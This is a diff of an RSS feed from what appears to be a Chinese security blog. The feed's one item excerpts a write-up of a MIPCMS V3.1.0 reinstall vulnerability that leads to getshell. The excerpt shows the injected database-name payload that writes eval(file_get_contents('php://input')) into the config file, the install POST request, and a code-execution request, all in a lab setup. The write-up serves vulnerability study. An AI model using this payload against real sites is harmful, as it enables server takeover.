@@ -1,22 +1,22 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>MIPCMS on F0rmat&#39;Blog</title>
+    <title>MIPCMS on F0rmat的博客 | 专注于网络攻防和信息安全</title>
     <link>https://getshe11.com/tags/mipcms/</link>
-    <description>Recent content in MIPCMS on F0rmat&#39;Blog</description>
+    <description>Recent content in MIPCMS on F0rmat的博客 | 专注于网络攻防和信息安全</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
+    <language>zh-cn</language>
     <lastBuildDate>Mon, 26 Mar 2018 01:09:26 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/mipcms/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</title>
-      <link>https://getshe11.com/posts/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</link>
+      <link>https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</link>
       <pubDate>Mon, 26 Mar 2018 01:09:26 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</guid>
+      <guid>https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</guid>
       <description>0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
 0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
 0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
-  username=admin&amp;amp;password=admin&amp;amp;rpassword=admin&amp;amp;dbport=3306&amp;amp;dbname=test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;&amp;amp;dbhost=192.168.1.102&amp;amp;dbuser=root&amp;amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
+  username=admin&amp;amp;password=admin&amp;amp;rpassword=admin&amp;amp;dbport=3306&amp;amp;dbname=test&amp;#39;,1=&amp;gt;eval(file_get_contents(&amp;#39;php://input&amp;#39;)),&amp;#39;2&amp;#39;=&amp;gt;&amp;#39;&amp;amp;dbhost=192.168.1.102&amp;amp;dbuser=root&amp;amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
 4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
 首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
  一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&amp;quot;#{$key}#&amp;quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&amp;#39;Access-Control-Allow-Origin: *&amp;#39;); header(&amp;#39;Access-Control-Allow-Credentials: true&amp;#39;); header(&amp;#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&amp;#39;); header(&amp;#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&amp;#39;); if (Request::instance()-&amp;gt;isPost()) {//判断是否有post的数据  $dbconfig[&amp;#39;type&amp;#39;]=&amp;#34;mysql&amp;#34;;//定义数据库类型  $dbconfig[&amp;#39;hostname&amp;#39;]=input(&amp;#39;post.</description>
